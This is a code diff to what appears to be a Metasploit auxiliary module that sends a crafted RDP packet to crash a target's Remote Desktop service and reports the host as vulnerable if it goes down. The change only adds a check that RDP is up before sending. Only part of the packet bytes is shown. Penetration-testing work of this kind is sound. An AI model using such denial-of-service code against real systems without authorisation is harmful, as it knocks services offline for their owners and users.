@@ -137,27 +137,27 @@ class Metasploit3 < Msf::Auxiliary
 			"\x03\x00\x00\x09" +  # TPKT: version + length
 			"\x02\xF0\x80"     +  # X.224
 			"\x21\x80"            # T.125
+		if is_rdp_up
+		  connect
+		  print_status("#{rhost}:#{rport} - Sending #{self.name}")
+		  sock.put(pkt)
+		  select(nil, nil, nil, 3)
+		  disconnect
+		  print_status("#{rhost}:#{rport} - #{pkt.length.to_s} bytes sent")
 
-		connect
-		print_status("#{rhost}:#{rport} - Sending #{self.name}")
-		sock.put(pkt)
-		select(nil, nil, nil, 3)
-		disconnect
-		print_status("#{rhost}:#{rport} - #{pkt.length.to_s} bytes sent")
-
-		print_status("#{rhost}:#{rport} - Checking RDP status...")
-		if not is_rdp_up
-			print_good("#{rhost}:#{rport} seems down")
-			report_vuln({
-				:host => rhost,
-				:port => rport,
-				:name => self.name,
-				:refs => self.references,
-				:info => "Module #{self.fullname} successfully crashed the target system via RDP"
-			})
-		else
-			print_status("#{rhost}:#{rport} is still up")
-		end
+		  print_status("#{rhost}:#{rport} - Checking RDP status...")
+		  if not is_rdp_up
+			  print_good("#{rhost}:#{rport} seems down")
+			  report_vuln({
+				  :host => rhost,
+				  :port => rport,
+				  :name => self.name,
+				  :refs => self.references,
+				  :info => "Module #{self.fullname} successfully crashed the target system via RDP"
+			  })
+		  else
+			  print_status("#{rhost}:#{rport} is still up")
+		  end
+	        end
 	end
-
 end
